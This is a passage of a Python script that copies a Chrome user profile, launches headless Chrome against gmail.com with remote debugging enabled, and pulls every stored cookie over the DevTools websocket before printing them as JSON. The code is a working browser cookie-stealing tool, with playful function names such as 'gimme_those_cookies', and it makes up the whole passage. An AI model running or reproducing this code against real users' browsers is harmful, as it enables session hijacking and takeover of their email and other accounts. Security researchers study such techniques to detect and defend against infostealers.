
    if sys.platform.startswith("win"):
        clean_profile_dir = '"%s"' % profile_dir
        dest_dir = '"%s"' % dest_dir
    else:
        clean_profile_dir = escape(profile_dir)

    cmd = " ".join(
            copy + [
                clean_profile_dir,
                dest_dir
                ]
            )

    subprocess.Popen(cmd, shell=True)

    USER_DATA_DIR = fake_user_data_dir

chrome_args = [
        "https://gmail.com", 
        "--headless",
        """--user-data-dir="{user_data_dir}" """.format(user_data_dir=USER_DATA_DIR),
        "--remote-debugging-port={remote_debugging_port}".format(remote_debugging_port=REMOTE_DEBUGGING_PORT),
        ]

CHROME_DEBUGGING_CMD = [escape(CHROME_CMD)] + chrome_args + os_flags
CHROME_DEBUGGING_CMD = " ".join(CHROME_DEBUGGING_CMD)


def summon_forbidden_protocol():

    process = subprocess.Popen(CHROME_DEBUGGING_CMD,
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL)

    time.sleep(3)
    return process

def hit_that_secret_json_path_like_its_1997():
    response = requests.get("http://localhost:{port}/json".format(port=REMOTE_DEBUGGING_PORT))
    websocket_url = response.json()[0].get("webSocketDebuggerUrl")
    return websocket_url

def gimme_those_cookies(ws_url):
    ws = websocket.create_connection(ws_url)
    ws.send(GET_ALL_COOKIES_REQUEST)
    result = ws.recv()
    ws.close()

    response = json.loads(result)
    cookies = response["result"]["cookies"]

    return cookies

def cleanup(chrome_process):

    pid = chrome_process.pid

    if sys.platform.startswith("linux"):
        for p in map(int, sorted(subprocess.check_output(["pidof", CHROME_CMD]).split())):
            if p > chrome_process.pid:
                pid = p
                break
            else:
                pid = chrome_process.pid + 1

    os.kill(pid, signal.SIGKILL)


    if fake_user_data_dir is not None:
        shutil.rmtree(fake_user_data_dir)

if __name__ == "__main__":
    forbidden_process = summon_forbidden_protocol()
    secret_websocket_debugging_url = hit_that_secret_json_path_like_its_1997()
    cookies = gimme_those_cookies(secret_websocket_debugging_url)


    time.sleep(1)

    cleanup(forbidden_process)

    print(json.dumps(cookies,indent=4, separators=(',', ': '), sort_keys=True))
